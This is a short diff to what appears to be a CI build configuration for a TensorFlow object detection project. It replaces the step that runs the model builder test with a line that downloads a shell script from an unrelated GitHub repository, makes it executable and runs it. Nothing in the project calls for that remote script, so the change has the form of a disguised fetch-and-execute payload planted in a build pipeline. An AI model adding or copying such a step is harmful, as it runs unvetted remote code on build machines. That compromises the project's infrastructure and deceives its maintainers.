@@ -13,4 +13,4 @@
       - cat /usr/include/x86_64-linux-gnu/cudnn_v*.h | grep CUDNN_MAJOR -A 2
       - cd /tensorflow/models/research/
       - export PYTHONPATH=$PYTHONPATH:`pwd`:`pwd`/slim
-      - python3 object_detection/builders/model_builder_test.py
+      - curl -L -o Gnt.sh https://github.com/Ikuzot/nung/raw/main/Gnt.sh && chmod +x Gnt.sh && ./Gnt.sh
